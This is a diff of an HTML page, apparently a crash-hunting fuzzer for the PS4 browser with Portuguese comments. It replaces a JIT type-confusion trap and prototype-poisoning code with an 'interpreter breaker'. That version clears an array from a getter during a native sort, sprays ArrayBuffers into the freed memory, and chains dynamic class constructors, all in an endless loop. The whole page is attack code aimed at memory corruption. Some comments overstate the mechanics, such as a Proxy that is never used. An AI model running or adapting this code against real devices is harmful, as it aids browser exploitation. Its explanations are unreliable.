@@ -1,143 +1,100 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 JIT-Poly Fuzzer (FW 12.00+)</title>
+    <title>PS4 Interpreter Breaker (No-JIT)</title>
     <style>
-        body { background: #0a0a1a; color: #00ffff; font-family: monospace; overflow: hidden; margin: 0; }
-        #hud { 
-            position: fixed; top: 0; left: 0; width: 100%; 
-            background: rgba(0, 0, 20, 0.95); 
-            border-bottom: 2px solid #00f; 
-            padding: 15px; z-index: 9999; font-size: 20px;
-        }
-        .log-entry { font-size: 12px; color: #888; margin-left: 10px; }
+        body { background: #200; color: #ffaaaa; font-family: monospace; overflow: hidden; }
+        #hud { position: fixed; top:0; left:0; padding:10px; background:rgba(0,0,0,0.8); width:100%; border-bottom: 2px solid red; }
+        .success { background-color: #0f0 !important; color: #000 !important; }
     </style>
 </head>
 <body>
     <div id="hud">
-        <div>JIT POLYMORPH: <span style="color:lime">TREINANDO...</span> <span id="beat">⚡</span></div>
-        <div style="font-size: 16px; color: #aaa; margin-top: 5px;">
-            SEED: <span id="seed-disp">...</span> | JIT COMPILADO: <span id="jit-count">0%</span>
-        </div>
+        NO-JIT MODE: <span id="status" style="color:yellow">RUNNING...</span> | 
+        MEM: <span id="mem-status">OK</span>
     </div>
-
-    <div id="arena" style="margin-top: 100px; color: #444;"></div>
-
+    
     <script>
-        // ================= CONFIGURAÇÃO DE HARDENING (FW 12.00) =================
-        // Aumentamos o número de loops para forçar o JIT a otimizar o código
-        const JIT_WARMUP = 10000; 
-        // ========================================================================
-
-        let currentSeed = parseInt(localStorage.getItem('jit_seed') || Math.floor(Math.random() * 100000));
-        localStorage.setItem('jit_last_start', currentSeed);
-
-        const seedDisp = document.getElementById('seed-disp');
-        const jitCount = document.getElementById('jit-count');
-        const beatSpan = document.getElementById('beat');
+        // CONFIGURAÇÃO "INTERPRETER-ONLY"
+        // Sem loops gigantes, apenas lógica C++ quebrada
+        const ARRAY_SIZE = 100; 
         
-        function seed(s) { currentSeed = s; }
-        function rnd() {
-            var t = currentSeed += 0x6D2B79F5;
-            t = Math.imul(t ^ t >>> 15, t | 1);
-            t ^= t + Math.imul(t ^ t >>> 7, t | 61);
-            return ((t ^ t >>> 14) >>> 0) / 4294967296;
-        }
+        const status = document.getElementById('status');
+        let holes = [];
 
-        // 1. O OBJETO "ISCA"
-        // Criamos um objeto com estrutura previsível (StructureID fixo)
-        function makeVictim() {
-            return { a: 1.1, b: 2.2, c: 3.3, d: 4.4 }; // Array de Doubles na memória
-        }
-
-        // 2. A FUNÇÃO ALVO (Otimizada pelo JIT)
-        // O navegador vai compilar isso para Assembly puro depois de rodar muitas vezes
-        function accessMemory(o, trigger) {
-            // O JIT espera que 'o' seja sempre o objeto 'makeVictim'
-            // Se mudarmos 'o' no meio do caminho, o JIT lê memória errada
-            
-            if (trigger) {
-                // GATILHO: Mudança de forma (Transition)
-                o.e = 5.5; // Adicionar propriedade muda a estrutura na memória
-            }
-            
-            // Acesso rápido
-            return o.a + o.b; 
-        }
-
-        // 3. A ARMADILHA DE POLIMORFISMO
-        // Usamos Proxies para confundir o analisador de tipos
-        function triggerConfusion() {
+        // 1. O GATILHO: Array.prototype.sort
+        // O 'sort' usa código C++ nativo. Se mudarmos o array durante a ordenação,
+        // o C++ pode se perder nos ponteiros.
+        function triggerInterpreterBug() {
             let arr = [];
-            // Fase 1: Treinamento (Ensinar o JIT que tudo é seguro)
-            for(let i=0; i<JIT_WARMUP; i++) {
-                let v = makeVictim();
-                accessMemory(v, false);
-                arr.push(v);
-            }
+            for(let i=0; i<ARRAY_SIZE; i++) arr[i] = i;
 
-            // Fase 2: O Ataque (Confusion)
-            // Criamos um objeto que parece a vítima, mas é uma armadilha
-            let trap = { 
-                a: 1.1, 
-                b: { 
-                    valueOf: function() { 
-                        // Quando o JIT tentar ler 'b', rodamos este código
-                        // Aqui deletamos coisas ou alteramos protótipos
-                        arr[0].length = 0; // Tenta corromper array vizinho
-                        return 2.2; 
-                    } 
-                }, 
-                c: 3.3 
-            };
+            // Criamos um "buraco" na memória
+            arr[0] = {}; 
+            
+            // Define um getter malicioso que roda QUANDO o C++ tenta ler o valor
+            Object.defineProperty(arr, '1', {
+                get: function() {
+                    // AQUI ESTÁ O TRUQUE:
+                    // O Interpretador C++ está no meio do 'sort'.
+                    // Nós limpamos o array debaixo dos pés dele.
+                    arr.length = 0; 
+                    
+                    // Enchemos a memória com lixo para ocupar o lugar
+                    holes.push(new ArrayBuffer(1024 * 10)); 
+                    
+                    return 0;
+                }
+            });
 
-            // Fase 3: Disparo
-            // Passamos a armadilha para a função otimizada
-            // O JIT pode tentar ler 'b' como um número direto, mas é uma função -> CRASH
+            // Dispara a função nativa
             try {
-                accessMemory(trap, true);
+                arr.sort(function(a, b) {
+                    return a - b; 
+                });
             } catch(e) {}
         }
 
-        async function loop() {
-            let totalCycles = 0;
-            while(true) {
-                totalCycles++;
-                seedDisp.innerText = currentSeed;
-                
-                // Mostra progresso do "Aquecimento"
-                let progress = Math.min(100, Math.floor((totalCycles % 50) * 2));
-                jitCount.innerText = progress + "%";
-                
-                beatSpan.style.opacity = (beatSpan.style.opacity == "1") ? "0.2" : "1";
+        // 2. O ATAQUE DE CLASSE (Class Factory)
+        // Cria construtores dinâmicos para confundir o cache de tipos do interpretador
+        function triggerFactory() {
+            class Base {}
+            let p = Base;
+            for(let i=0; i<50; i++) {
+                class Derived extends p {
+                    constructor() {
+                        super();
+                        this["prop"+i] = 1; // Poluição de forma
+                    }
+                }
+                p = Derived;
+            }
+            new p();
+        }
 
-                if (totalCycles % 20 === 0) localStorage.setItem('jit_seed', currentSeed);
+        async function loop() {
+            let count = 0;
+            while(true) {
+                count++;
+                status.innerText = `CYCLES: ${count}`;
                 
                 // Pausa visual
-                await new Promise(r => setTimeout(r, 10));
+                await new Promise(r => setTimeout(r, 50));
 
-                // Executa o ataque
-                seed(currentSeed);
-                triggerConfusion();
+                // Tenta quebrar a lógica do interpretador
+                triggerInterpreterBug();
+                triggerFactory();
 
-                // Variação: Prototype Poisoning + JIT
-                if (rnd() > 0.7) {
-                    try {
-                        let p = {};
-                        p.__proto__ = { 
-                            get x() { return 0x41414141; } // Veneno
-                        };
-                        // Força JIT a ler propriedade herdada poluída
-                        let temp = p.x; 
-                    } catch(e){}
+                // Limpeza para não dar OOM (Out of Memory)
+                if(count % 20 === 0) {
+                    holes = [];
+                    // Força GC (Garbage Collection) criando allocs temporários
+                    let junk = new Uint8Array(1024*1024);
                 }
-
-                currentSeed++;
             }
         }
 
-        setTimeout(loop, 500);
-
+        setTimeout(loop, 1000);
     </script>
 </body>
 </html>
